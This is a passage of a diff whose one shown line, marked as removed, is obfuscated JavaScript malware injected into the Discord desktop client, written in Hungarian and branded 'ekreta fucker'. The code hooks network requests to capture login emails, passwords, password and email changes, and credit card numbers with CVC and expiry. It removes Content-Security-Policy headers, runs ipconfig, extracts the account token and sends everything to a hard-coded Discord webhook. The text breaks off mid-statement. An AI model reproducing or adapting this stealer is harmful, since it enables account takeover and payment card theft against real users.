@@ -1,1 +1,849 @@
-var _0x4b4897=_0x1d8e;(function(_0x320b3b,_0x17c008){var _0x13ff72=_0x1d8e,_0x5eed3d=_0x320b3b();while(!![]){try{var _0x3b3733=parseInt(_0x13ff72(0x112))/0x1*(-parseInt(_0x13ff72(0xed))/0x2)+parseInt(_0x13ff72(0x13f))/0x3*(parseInt(_0x13ff72(0x11f))/0x4)+-parseInt(_0x13ff72(0x100))/0x5*(parseInt(_0x13ff72(0x164))/0x6)+parseInt(_0x13ff72(0xf9))/0x7+-parseInt(_0x13ff72(0x167))/0x8*(-parseInt(_0x13ff72(0x174))/0x9)+parseInt(_0x13ff72(0x173))/0xa+-parseInt(_0x13ff72(0x168))/0xb;if(_0x3b3733===_0x17c008)break;else _0x5eed3d['push'](_0x5eed3d['shift']());}catch(_0x5a543c){_0x5eed3d['push'](_0x5eed3d['shift']());}}}(_0x4076,0x5b607));function _0x4076(){var _0x4bd2c3=['<:developer:874750808472825986>','34ejANqd','https://api.stripe.com/v*/setup_intents/*/confirm','defaultSession','card[exp_year]','region','application/json','https://imgs.search.brave.com/N-9kvAmVSutTgaCanpsI7xMw51dGFLLZtG31JNIGAGg/rs:fit:512:512:1/g:ce/aHR0cDovL3NvYnN6/ZWdlZC5odS9vcmRl/cmVkLzY0MTY5L3Bp/Yy9rcmV0YS5wbmc','url','exp_year','login','existsSync','endsWith','2825725ModAFS','<:early_supporter:874750808414113823>','webContents','filters','emailChanged','```Nincs\x20nitro```','discord-webhook-node','5hFnuaA','end','country','```❌```','**Összes\x20barát\x20(','Jelszó','<a:boost:824036778570416129>\x20``Nitro\x20Boost``','child_process','<:bravery:874750808388952075>','Belépési\x20azonosító','event','Emoji','notify_on_logout','phone','https://fasszopo.kiberesek.com','responseHeaders','card[cvc]','Value','22231KdopFx','avatar','Új\x20jelszó','https://discordapp.com/api/v*/users/@me','uploadData','error','pathname','replace','qr_codes','startsWith','public_flags','\x20:credit_card:','type','52QNZtJv','<:partner:874750808678354964>','\x0aIdőzóna:\x20','https://cdn.discordapp.com/embed/avatars/0.png','timezone','executeJavaScript','new_password','onCompleted','Felhasználó','method','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','\x20||','webRequest','length','request','Nincsenek\x20értékes\x20barátok','statusCode','electron','Hitelkártya\x20lejárata','./core.asar','https://discord.com/api/v*/users/@me/library','https://discord.com/api/v*/auth/login','https://*.discord.com/api/v*/users/@me/library','Számlázás','ping','userLogin','avatar_url','ekreta_fucker','invalid','```','wss://remote-auth-gateway.discord.gg/*','onHeadersReceived','124743cxcVJw','logout','\x22);\x20xmlHttp.send(\x20null\x20);\x20xmlHttp.responseText','premium_type','creditCardAdded','Felhasználó\x20kijelentkeztetve','Régi\x20jelszó','https://*.discord.com/api/v*/users/@me','Email\x20Cím','user','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','\x20<:paypal:896441236062347374>','unlink','env','<:brilliance:874750808338608199>','<:hypesquad_events:874750808594477056>','Hitelkártya\x20szám','Ismeretlen','<:classic:896119171019067423>\x20``Nitro\x20Classic``','badges','Új\x20Email\x20Cím','Hitelkártya\x20CVC','Discord\x20Kliens\x20beazonosítva','POST','webhook','Nitro\x20típus','Rare','Email\x20Cím\x20megváltozott','discriminator','from','username','embed','https://*.discord.com/api/v*/users/@me/billing/subscriptions','https://cdn.discordapp.com/avatars/','Csatlakozási\x20adatok','exp_month','Nincs','2659542tKCCjs','stringify','discord.com','7384XfVmZh','3347575VQsQKH','ekreta\x20fucker','@everyone','<:bughunter_2:874750808430874664>','then','https://*.discord.com/api/v*/auth/login','Szelvények','Telefonszám','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/relationships\x22,\x20false\x20);xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/billing/payment-sources\x22,\x20false\x20);\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','mkdirSync','4180330iDFmHW','1341DbojZu','Access-Control-Allow-Origin\x20\x27*\x27','write','\x20|\x20','footer','split','bytes','<:bughunter_1:874750808426692658>','frien','```yaml\x0aIP\x20Cím:\x20','content','token','```Nincs```','parse','./ipconfig.txt','\x0aRégió:\x20','href','\x22);xmlHttp.send(\x20null\x20);xmlHttp.responseText;','Access-Control-Allow-Headers\x20\x27*\x27','`✔️`','Kliens\x20verzió','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://ipinfo.io/json\x22,\x20false\x20);xmlHttp.send(\x20null\x20);xmlHttp.responseText;','email','handle','sendFile','ipconfig\x20/all','assign','\x0aOrszág:\x20','Discord\x20Kliens\x20beazonosítva\x20(Nincs\x20bejelentkezve)','entries','Jelszó\x20megváltozott','<:balance:874750808267292683>','number','password','notify_on_initialization','https://api.stripe.com/v*/payment_intents/*/confirm','cwd','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',')**\x0a\x0a','https://discordapp.com/api/v*/auth/login','onBeforeRequest','filter','PATCH','includes','https://discord.com/api/webhooks/1026932252527034468/EeNHdK3Xq4bQ3kU2IGqHbhz6AqjY60xeYAZM1DIA4mf7fUuWEIQxVc_D7nxhBTTFGI78','flags','hostname','Bejelentkezett\x20felhasználó','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','log','<:staff:874750808728666152>','getAllWindows','data','passwordChanged','host','\x0aSzolgáltató:\x20','ipconfig.txt','city'];_0x4076=function(){return _0x4bd2c3;};return _0x4076();}function _0x1d8e(_0x173e43,_0x2880ec){var _0x40769a=_0x4076();return _0x1d8e=function(_0x1d8eff,_0x2d8e57){_0x1d8eff=_0x1d8eff-0xe6;var _0x5430c4=_0x40769a[_0x1d8eff];return _0x5430c4;},_0x1d8e(_0x173e43,_0x2880ec);}const {BrowserWindow,session}=require(_0x4b4897(0x130)),os=require('os'),https=require('https'),querystring=require('querystring'),fs=require('fs'),fetch=(..._0x5ceaf8)=>import('node-fetch')[_0x4b4897(0x16c)](({default:_0x454625})=>_0x454625(..._0x5ceaf8)),{exec}=require(_0x4b4897(0x107)),{Webhook}=require(_0x4b4897(0xff));var config={'brand':_0x4b4897(0x13a),'webhook':_0x4b4897(0x1a0),'logout':!![],'disable_qr_code':!![],'notify_on_logout':!![],'notify_on_initialization':!![],'ping':[!![],_0x4b4897(0x16a)],'embed':{'username':_0x4b4897(0x169),'footer':{'text':'ekreta\x20fucker','icon_url':'https://imgs.search.brave.com/N-9kvAmVSutTgaCanpsI7xMw51dGFLLZtG31JNIGAGg/rs:fit:512:512:1/g:ce/aHR0cDovL3NvYnN6/ZWdlZC5odS9vcmRl/cmVkLzY0MTY5L3Bp/Yy9rcmV0YS5wbmc'},'href':_0x4b4897(0x10e),'avatar_url':_0x4b4897(0xf3)},'badges':{'Discord_Employee':{'Value':0x1,'Emoji':_0x4b4897(0x1a6),'Rare':!![]},'Partnered_Server_Owner':{'Value':0x2,'Emoji':_0x4b4897(0x120),'Rare':!![]},'HypeSquad_Events':{'Value':0x4,'Emoji':_0x4b4897(0x14e),'Rare':!![]},'Bug_Hunter_Level_1':{'Value':0x8,'Emoji':_0x4b4897(0x17b),'Rare':!![]},'Early_Supporter':{'Value':0x200,'Emoji':_0x4b4897(0xfa),'Rare':!![]},'Bug_Hunter_Level_2':{'Value':0x4000,'Emoji':_0x4b4897(0x16b),'Rare':!![]},'Early_Verified_Bot_Developer':{'Value':0x20000,'Emoji':_0x4b4897(0xec),'Rare':!![]},'House_Bravery':{'Value':0x40,'Emoji':_0x4b4897(0x108),'Rare':![]},'House_Brilliance':{'Value':0x80,'Emoji':_0x4b4897(0x14d),'Rare':![]},'House_Balance':{'Value':0x100,'Emoji':_0x4b4897(0x193),'Rare':![]}},'filters':{'user':{'urls':['https://discord.com/api/v*/users/@me',_0x4b4897(0x115),_0x4b4897(0x146),_0x4b4897(0x19b),_0x4b4897(0x134),_0x4b4897(0x16d),_0x4b4897(0x199),'https://api.stripe.com/v*/tokens',_0x4b4897(0xee),_0x4b4897(0x197)]},'qr_codes':{'urls':[_0x4b4897(0x129),'https://*.discord.com/api/v*/applications/detectable','https://discord.com/api/v*/applications/detectable',_0x4b4897(0x135),_0x4b4897(0x133),_0x4b4897(0x15f),'https://discord.com/api/v*/users/@me/billing/subscriptions',_0x4b4897(0x13d)]}}};exec(_0x4b4897(0x18d),(_0x55e23e,_0x12c894,_0x2e6231)=>{var _0x5dcaec=_0x4b4897;fs['writeFile'](_0x5dcaec(0xea),_0x12c894,async function(_0x519fdb){var _0x37dd90=_0x5dcaec;const _0x1803ba=new Webhook(config[_0x37dd90(0x157)]);await _0x1803ba[_0x37dd90(0x18c)](_0x37dd90(0x182));}),setTimeout(function(){var _0x72c4f6=_0x5dcaec;fs[_0x72c4f6(0x14b)](_0x72c4f6(0xea),function(_0x34c3f9){if(_0x34c3f9)throw _0x34c3f9;});},0x1f40);});var execScript=_0x43526d=>{var _0x2fd883=_0x4b4897;const _0x5e139d=BrowserWindow[_0x2fd883(0x1a7)]()[0x0];return _0x5e139d[_0x2fd883(0xfb)][_0x2fd883(0x124)](_0x43526d,!![]);};class Event{constructor(_0x24f784,_0x449b54,_0x27cba7){var _0x1f323f=_0x4b4897;for(let [_0x2df5a6,_0x1a583d]of Object[_0x1f323f(0x191)]({'event':_0x24f784,'data':_0x27cba7,'token':_0x449b54})){this[_0x2df5a6]=_0x1a583d;}}[_0x4b4897(0x18b)](){var _0x2a9f66=_0x4b4897;switch(this[_0x2a9f66(0x10a)]){case _0x2a9f66(0xe7):event_handlers[_0x2a9f66(0xe7)](this[_0x2a9f66(0xe6)][_0x2a9f66(0x195)],this[_0x2a9f66(0xe6)][_0x2a9f66(0x125)],this[_0x2a9f66(0x17f)]);break;case _0x2a9f66(0x138):event_handlers[_0x2a9f66(0x138)](this['data']['password'],this[_0x2a9f66(0xe6)][_0x2a9f66(0x18a)],this[_0x2a9f66(0x17f)]);break;case'emailChanged':event_handlers[_0x2a9f66(0xfd)](this[_0x2a9f66(0xe6)][_0x2a9f66(0x195)],this[_0x2a9f66(0xe6)][_0x2a9f66(0x18a)],this[_0x2a9f66(0x17f)]);break;case'creditCardAdded':event_handlers[_0x2a9f66(0x143)](this['data'][_0x2a9f66(0x194)],this['data']['cvc'],this[_0x2a9f66(0xe6)][_0x2a9f66(0x162)],this[_0x2a9f66(0xe6)][_0x2a9f66(0xf5)],this[_0x2a9f66(0x17f)]);}}}session[_0x4b4897(0xef)]['webRequest'][_0x4b4897(0x13e)]((_0x2d7191,_0x1ee5d4)=>{var _0xcde2c7=_0x4b4897;try{_0x2d7191['url'][_0xcde2c7(0x11b)](config[_0xcde2c7(0x157)])?_0x2d7191[_0xcde2c7(0xf4)][_0xcde2c7(0x19f)](_0xcde2c7(0x166))?_0x1ee5d4({'responseHeaders':Object[_0xcde2c7(0x18e)]({'Access-Control-Allow-Headers':'*'},_0x2d7191['responseHeaders'])}):_0x1ee5d4({'responseHeaders':Object[_0xcde2c7(0x18e)]({'Content-Security-Policy':['default-src\x20\x27*\x27',_0xcde2c7(0x186),_0xcde2c7(0x175)],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x2d7191[_0xcde2c7(0x10f)])}):(delete _0x2d7191[_0xcde2c7(0x10f)]['content-security-policy'],delete _0x2d7191['responseHeaders']['content-security-policy-report-only'],_0x1ee5d4({'responseHeaders':{..._0x2d7191['responseHeaders'],'Access-Control-Allow-Headers':'*'}}));}catch{}}),session[_0x4b4897(0xef)]['webRequest'][_0x4b4897(0x19c)](config[_0x4b4897(0xfc)][_0x4b4897(0x11a)],async(_0x4a403f,_0x13e4f1)=>{var _0x55a733=_0x4b4897;if(_0x4a403f[_0x55a733(0xf4)][_0x55a733(0x11b)]('wss://')){if(!config['disable_qr_code']==![]){_0x13e4f1({'cancel':!![]});return;}}await initialize(),_0x13e4f1({});return;}),session[_0x4b4897(0xef)][_0x4b4897(0x12b)][_0x4b4897(0x126)](config['filters']['user'],async(_0x50aa7c,_0x198db7)=>{var _0x45c018=_0x4b4897;try{if(_0x50aa7c[_0x45c018(0x12f)]==0xc8||_0x50aa7c[_0x45c018(0x12f)]==0xcc){const _0x44b9a8=Buffer[_0x45c018(0x15c)](_0x50aa7c[_0x45c018(0x116)][0x0][_0x45c018(0x17a)])['toString'](),_0x5e64d8=JSON[_0x45c018(0x181)](_0x44b9a8),_0x1891ee=await getToken();switch(!![]){case _0x50aa7c[_0x45c018(0xf4)]['endsWith'](_0x45c018(0xf6)):new Event(_0x45c018(0x138),_0x1891ee,{'password':_0x5e64d8['password'],'email':_0x5e64d8[_0x45c018(0xf6)]})[_0x45c018(0x18b)]();;return;case _0x50aa7c[_0x45c018(0xf4)][_0x45c018(0xf8)]('tokens')&&_0x50aa7c['method']==_0x45c018(0x156):const _0x4bc390=querystring[_0x45c018(0x181)](_0x44b9a8['toString']());new Event('creditCardAdded',_0x1891ee,{'number':_0x4bc390['card[number]'],'cvc':_0x4bc390[_0x45c018(0x110)],'exp_month':_0x4bc390['card[exp_month]'],'exp_year':_0x4bc390[_0x45c018(0xf0)]});case _0x50aa7c['url'][_0x45c018(0xf8)]('users/@me')&&_0x50aa7c[_0x45c018(0x128)]==_0x45c018(0x19e):if(!_0x5e64d8['password'])return;_0x5e64d8[_0x45c018(0x18a)]&&new Event('emailChanged',_0x1891ee,{'password':_0x5e64d8[_0x45c018(0x195)],'email':_0x5e64d8['email']})[_0x45c018(0x18b)]();;_0x5e64d8[_0x45c018(0x125)]&&new Event('passwordChanged',_0x1891ee,{'password':_0x5e64d8[_0x45c018(0x195)],'new_password':_0x5e64d8[_0x45c018(0x125)]})[_0x45c018(0x18b)]();;return;default:break;}}else return;}catch{}});var event_handlers={async 'creditCardAdded'(_0xffb1e2,_0x3c1cc3,_0x2b0a29,_0x1d05f9){var _0x25085e=_0x4b4897;const _0x1dbcb3=await getUserInfo(token),_0x5ca33c=await getBilling(token),_0x455e56=await getRelationships(token);var _0x472eef={'username':config[_0x25085e(0x15e)][_0x25085e(0x15d)],'avatar_url':config[_0x25085e(0x15e)][_0x25085e(0x139)],'embeds':[createEmbed({'title':'Hitelkártya\x20hozzáadva','url':config[_0x25085e(0x15e)][_0x25085e(0x184)],'author':{'name':_0x1dbcb3[_0x25085e(0x15d)]+'#'+_0x1dbcb3['discriminator']+'\x20('+_0x1dbcb3['id']+')','url':config[_0x25085e(0x15e)][_0x25085e(0x184)],'icon_url':_0x1dbcb3[_0x25085e(0x113)]?_0x25085e(0x160)+_0x1dbcb3['id']+'/'+_0x1dbcb3['avatar']:_0x25085e(0x122)},'thumbnail':{'url':_0x1dbcb3[_0x25085e(0x113)]?_0x25085e(0x160)+_0x1dbcb3['id']+'/'+_0x1dbcb3[_0x25085e(0x113)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'fields':[{'name':_0x25085e(0x14f),'value':_0x25085e(0x13c)+_0xffb1e2+'```','inline':!![]},{'name':_0x25085e(0x154),'value':_0x25085e(0x13c)+_0x3c1cc3+_0x25085e(0x13c),'inline':!![]},{'name':_0x25085e(0x131),'value':_0x25085e(0x13c)+_0x2b0a29+'/'+_0x1d05f9+_0x25085e(0x13c),'inline':!![]},{'name':_0x25085e(0x16f),'value':_0x25085e(0x13c)+(_0x1dbcb3[_0x25085e(0x10d)]??_0x25085e(0x163))+'```','inline':![]},{'name':_0x25085e(0x158),'value':''+getNitro(_0x1dbcb3['premium_type']),'inline':![]},{'name':_0x25085e(0x136),'value':''+_0x5ca33c,'inline':!![]},{'name':'Szelvények','value':''+getBadges(_0x1dbcb3[_0x25085e(0x1a1)]),'inline':![]},{'name':_0x25085e(0x109),'value':_0x25085e(0x13c)+token+_0x25085e(0x13c),'inline':![]}]}),createEmbed({'description':'**Összes\x20barát\x20('+_0x455e56[_0x25085e(0x12c)]+_0x25085e(0x19a)+_0x455e56[_0x25085e(0x17c)],'thumbnail':{'url':_0x1dbcb3[_0x25085e(0x113)]?_0x25085e(0x160)+_0x1dbcb3['id']+'/'+_0x1dbcb3['avatar']:'https://cdn.discordapp.com/embed/avatars/0.png'},'author':{'name':_0x1dbcb3['username']+'#'+_0x1dbcb3[_0x25085e(0x15b)]+'\x20('+_0x1dbcb3['id']+')','url':config['embed'][_0x25085e(0x184)],'icon_url':_0x1dbcb3[_0x25085e(0x113)]?_0x25085e(0x160)+_0x1dbcb3['id']+'/'+_0x1dbcb3[_0x25085e(0x113)]:_0x25085e(0x122)}})]};sendToWebhook(_0x472eef);},async 'userLogin'(_0x246f9c,_0x192b4e,_0x4b7cc9){var _0x147c79=_0x4b4897;const _0x30bcac=await getUserInfo(_0x4b7cc9),_0x240878=await getBilling(_0x4b7cc9),_0x12a2f5=await getRelationships(_0x4b7cc9);var _0x2e0233={'username':config['embed']['username'],'avatar_url':config['embed'][_0x147c79(0x139)],'embeds':[createEmbed({'title':_0x147c79(0x1a3),'url':config['embed']['href'],'author':{'name':_0x30bcac[_0x147c79(0x15d)]+'#'+_0x30bcac[_0x147c79(0x15b)]+'\x20('+_0x30bcac['id']+')','url':config[_0x147c79(0x15e)]['href'],'icon_url':_0x30bcac[_0x147c79(0x113)]?'https://cdn.discordapp.com/avatars/'+_0x30bcac['id']+'/'+_0x30bcac[_0x147c79(0x113)]:_0x147c79(0x122)},'thumbnail':{'url':_0x30bcac['avatar']?'https://cdn.discordapp.com/avatars/'+_0x30bcac['id']+'/'+_0x30bcac[_0x147c79(0x113)]:_0x147c79(0x122)},'fields':[{'name':_0x147c79(0x105),'value':_0x147c79(0x13c)+_0x246f9c+_0x147c79(0x13c),'inline':!![]},{'name':_0x147c79(0x147),'value':_0x147c79(0x13c)+_0x192b4e+_0x147c79(0x13c),'inline':!![]},{'name':'Telefonszám','value':_0x147c79(0x13c)+(_0x30bcac[_0x147c79(0x10d)]??_0x147c79(0x163))+_0x147c79(0x13c),'inline':![]},{'name':_0x147c79(0x158),'value':''+getNitro(_0x30bcac[_0x147c79(0x142)]),'inline':![]},{'name':_0x147c79(0x136),'value':''+_0x240878,'inline':!![]},{'name':_0x147c79(0x16e),'value':''+getBadges(_0x30bcac['flags']),'inline':![]},{'name':_0x147c79(0x109),'value':_0x147c79(0x13c)+_0x4b7cc9+'```','inline':![]}]}),createEmbed({'description':'**Összes\x20barát\x20('+_0x12a2f5[_0x147c79(0x12c)]+_0x147c79(0x19a)+_0x12a2f5[_0x147c79(0x17c)],'thumbnail':{'url':_0x30bcac[_0x147c79(0x113)]?'https://cdn.discordapp.com/avatars/'+_0x30bcac['id']+'/'+_0x30bcac['avatar']:_0x147c79(0x122)},'author':{'name':_0x30bcac[_0x147c79(0x15d)]+'#'+_0x30bcac[_0x147c79(0x15b)]+'\x20('+_0x30bcac['id']+')','url':config[_0x147c79(0x15e)]['href'],'icon_url':_0x30bcac[_0x147c79(0x113)]?_0x147c79(0x160)+_0x30bcac['id']+'/'+_0x30bcac[_0x147c79(0x113)]:_0x147c79(0x122)}})]};sendToWebhook(_0x2e0233);},async 'emailChanged'(_0x328975,_0x16a25f,_0x1f9e39){var _0x4b963a=_0x4b4897,_0x38ea36=await getUserInfo(_0x1f9e39),_0x96aaeb=await getBilling(_0x1f9e39),_0x348532=await getRelationships(_0x1f9e39),_0x3aea93={'username':config[_0x4b963a(0x15e)][_0x4b963a(0x15d)],'avatar_url':config[_0x4b963a(0x15e)][_0x4b963a(0x139)],'embeds':[createEmbed({'title':_0x4b963a(0x15a),'url':config[_0x4b963a(0x15e)][_0x4b963a(0x184)],'author':{'name':_0x38ea36[_0x4b963a(0x15d)]+'#'+_0x38ea36['discriminator']+'\x20('+_0x38ea36['id']+')','url':config['embed'][_0x4b963a(0x184)],'icon_url':_0x38ea36[_0x4b963a(0x113)]?'https://cdn.discordapp.com/avatars/'+_0x38ea36['id']+'/'+_0x38ea36[_0x4b963a(0x113)]:_0x4b963a(0x122)},'thumbnail':{'url':_0x38ea36[_0x4b963a(0x113)]?_0x4b963a(0x160)+_0x38ea36['id']+'/'+_0x38ea36[_0x4b963a(0x113)]:_0x4b963a(0x122)},'fields':[{'name':_0x4b963a(0x153),'value':'```'+_0x16a25f+_0x4b963a(0x13c),'inline':!![]},{'name':'Jelszó','value':_0x4b963a(0x13c)+_0x328975+_0x4b963a(0x13c),'inline':!![]},{'name':_0x4b963a(0x16f),'value':'```'+(_0x38ea36['phone']??'Nincs')+'```','inline':![]},{'name':_0x4b963a(0x158),'value':''+getNitro(_0x38ea36[_0x4b963a(0x142)]),'inline':![]},{'name':_0x4b963a(0x136),'value':''+_0x96aaeb,'inline':!![]},{'name':'Szelvények','value':''+getBadges(_0x38ea36[_0x4b963a(0x1a1)]),'inline':![]},{'name':_0x4b963a(0x109),'value':_0x4b963a(0x13c)+_0x1f9e39+'```','inline':![]}]}),createEmbed({'description':'**Összes\x20Barát\x20('+_0x348532[_0x4b963a(0x12c)]+_0x4b963a(0x19a)+_0x348532[_0x4b963a(0x17c)],'thumbnail':{'url':_0x38ea36[_0x4b963a(0x113)]?_0x4b963a(0x160)+_0x38ea36['id']+'/'+_0x38ea36['avatar']:_0x4b963a(0x122)},'author':{'name':_0x38ea36[_0x4b963a(0x15d)]+'#'+_0x38ea36[_0x4b963a(0x15b)]+'\x20('+_0x38ea36['id']+')','url':config['embed']['href'],'icon_url':_0x38ea36[_0x4b963a(0x113)]?'https://cdn.discordapp.com/avatars/'+_0x38ea36['id']+'/'+_0x38ea36[_0x4b963a(0x113)]:_0x4b963a(0x122)}})]};sendToWebhook(_0x3aea93);},async 'passwordChanged'(_0x4ede8c,_0x369488,_0x29d3ca){var _0x1e1925=_0x4b4897,_0x4423b4=await getUserInfo(_0x29d3ca),_0x59b602=await getBilling(_0x29d3ca),_0x44425e=await getRelationships(_0x29d3ca),_0x24a144={'username':config['embed'][_0x1e1925(0x15d)],'avatar_url':config[_0x1e1925(0x15e)][_0x1e1925(0x139)],'embeds':[createEmbed({'title':_0x1e1925(0x192),'url':config['embed'][_0x1e1925(0x184)],'author':{'name':_0x4423b4[_0x1e1925(0x15d)]+'#'+_0x4423b4[_0x1e1925(0x15b)]+'\x20('+_0x4423b4['id']+')','url':config['embed'][_0x1e1925(0x184)],'icon_url':_0x4423b4[_0x1e1925(0x113)]?_0x1e1925(0x160)+_0x4423b4['id']+'/'+_0x4423b4['avatar']:_0x1e1925(0x122)},'thumbnail':{'url':_0x4423b4[_0x1e1925(0x113)]?_0x1e1925(0x160)+_0x4423b4['id']+'/'+_0x4423b4['avatar']:_0x1e1925(0x122)},'fields':[{'name':_0x1e1925(0x145),'value':'```'+_0x4ede8c+_0x1e1925(0x13c),'inline':![]},{'name':_0x1e1925(0x114),'value':_0x1e1925(0x13c)+_0x369488+_0x1e1925(0x13c),'inline':![]},{'name':_0x1e1925(0x16f),'value':'```'+(_0x4423b4['phone']??_0x1e1925(0x163))+_0x1e1925(0x13c),'inline':![]},{'name':_0x1e1925(0x158),'value':''+getNitro(_0x4423b4[_0x1e1925(0x142)]),'inline':![]},{'name':'Számlázás','value':''+_0x59b602,'inline':!![]},{'name':_0x1e1925(0x16e),'value':''+getBadges(_0x4423b4['flags']),'inline':![]},{'name':_0x1e1925(0x109),'value':_0x1e1925(0x13c)+_0x29d3ca+_0x1e1925(0x13c),'inline':![]}]}),createEmbed({'description':_0x1e1925(0x104)+_0x44425e[_0x1e1925(0x12c)]+')**\x0a\x0a'+_0x44425e[_0x1e1925(0x17c)],'thumbnail':{'url':_0x4423b4[_0x1e1925(0x113)]?_0x1e1925(0x160)+_0x4423b4['id']+'/'+_0x4423b4[_0x1e1925(0x113)]:_0x1e1925(0x122)},'author':{'name':_0x4423b4[_0x1e1925(0x15d)]+'#'+_0x4423b4['discriminator']+'\x20('+_0x4423b4['id']+')','url':config[_0x1e1925(0x15e)][_0x1e1925(0x184)],'icon_url':_0x4423b4[_0x1e1925(0x113)]?'https://cdn.discordapp.com/avatars/'+_0x4423b4['id']+'/'+_0x4423b4[_0x1e1925(0x113)]:_0x1e1925(0x122)}})]};sendToWebhook(_0x24a144);}};function getDiscordClient(){var _0x18de4e=_0x4b4897;return''+process[_0x18de4e(0x198)]()[_0x18de4e(0x119)](process[_0x18de4e(0x14c)]['LOCALAPPDATA']+'\x5c','')['split']('\x5c')[0x0][_0x18de4e(0x179)](0x7);}function getNitro(_0xbd4b00){var _0xd3f021=_0x4b4897;switch(_0xbd4b00){case 0x0:return _0xd3f021(0xfe);case 0x1:return _0xd3f021(0x151);case 0x2:return _0xd3f021(0x106);default:return _0xd3f021(0xfe);};}function getRareBadges(_0x3d2fcf){var _0x233311=_0x4b4897,_0x365593='';for(const _0x49b31b in config[_0x233311(0x152)]){let _0x1b800e=config[_0x233311(0x152)][_0x49b31b];if((_0x3d2fcf&_0x1b800e[_0x233311(0x111)])==_0x1b800e[_0x233311(0x111)]&&_0x1b800e[_0x233311(0x159)])_0x365593+=_0x1b800e[_0x233311(0x10b)];};return _0x365593;}function getBadges(_0x48c958){var _0x1c5666=_0x4b4897,_0x58ae42='';for(const _0x5428d9 in config[_0x1c5666(0x152)]){let _0x2f0248=config[_0x1c5666(0x152)][_0x5428d9];if((_0x48c958&_0x2f0248[_0x1c5666(0x111)])==_0x2f0248['Value'])_0x58ae42+=_0x2f0248[_0x1c5666(0x10b)];};if(_0x58ae42=='')_0x58ae42=_0x1c5666(0x180);return _0x58ae42;}async function getToken(){return await execScript('for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x27get_require\x27]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x27getToken\x27==a&&(token=b.default.getToken())}token;',!![]);}async function getIp(){var _0x239a4b=_0x4b4897;return JSON['parse'](await execScript(_0x239a4b(0x189),!![]));}async function getUserInfo(_0x4b9649){var _0x105b04=_0x4b4897;return JSON['parse'](await execScript(_0x105b04(0x1a4)+_0x4b9649+_0x105b04(0x185),!![]));}async function getBilling(_0x29e1f7){var _0x10e3a6=_0x4b4897,_0x4a5bff=await execScript(_0x10e3a6(0x171)+_0x29e1f7+_0x10e3a6(0x141),!![]),_0x784a65=JSON[_0x10e3a6(0x181)](_0x4a5bff),_0x5ab44c='';_0x784a65['forEach'](_0x56b1e2=>{var _0x432562=_0x10e3a6;if(_0x56b1e2[_0x432562(0x11e)]=='')return _0x432562(0x103);else{if(_0x56b1e2[_0x432562(0x11e)]==0x2&&_0x56b1e2[_0x432562(0x13b)]!=!![])_0x5ab44c+=_0x432562(0x187)+_0x432562(0x14a);else{if(_0x56b1e2[_0x432562(0x11e)]==0x1&&_0x56b1e2[_0x432562(0x13b)]!=!![])_0x5ab44c+=_0x432562(0x187)+_0x432562(0x11d);else return _0x432562(0x103);}};});if(_0x5ab44c=='')_0x5ab44c=_0x10e3a6(0x103);return _0x5ab44c;}async function getRelationships(_0x2bb28f){var _0x1aa6a3=_0x4b4897,_0x4ea2c3=await execScript(_0x1aa6a3(0x170)+_0x2bb28f+'\x22);xmlHttp.send(\x20null\x20);xmlHttp.responseText',!![]),_0x41f1da=JSON[_0x1aa6a3(0x181)](_0x4ea2c3);const _0x448a60=_0x41f1da[_0x1aa6a3(0x19d)](_0x48972a=>{var _0xce5dd8=_0x1aa6a3;return _0x48972a[_0xce5dd8(0x11e)]==0x1;});var _0xfe5e7e='';for(z of _0x448a60){var _0x171074=getRareBadges(z[_0x1aa6a3(0x148)][_0x1aa6a3(0x11c)]);_0x171074!=''&&(_0xfe5e7e+=_0x171074+(_0x1aa6a3(0x177)+z['user']['username']+'#'+z[_0x1aa6a3(0x148)]['discriminator']+'\x0a'));}if(!_0xfe5e7e)_0xfe5e7e=_0x1aa6a3(0x12e);return{'length':_0x448a60[_0x1aa6a3(0x12c)],'frien':_0xfe5e7e};}function sendToWebhook(_0xf9f70e){var _0x43557a=_0x4b4897;config[_0x43557a(0x137)][0x0]==!![]&&(_0xf9f70e[_0x43557a(0x17e)]?_0xf9f70e[_0x43557a(0x17e)]=_0xf9f70e['content']+(_0x43557a(0x12a)+config[_0x43557a(0x137)][0x1]+'||'):_0xf9f70e[_0x43557a(0x17e)]='||'+config[_0x43557a(0x137)][0x1]+'||');var _0x2c4e5e=new URL(config[_0x43557a(0x157)]),_0x2699f2={'Content-Type':_0x43557a(0xf2),'Access-Control-Allow-Origin':'*'};const 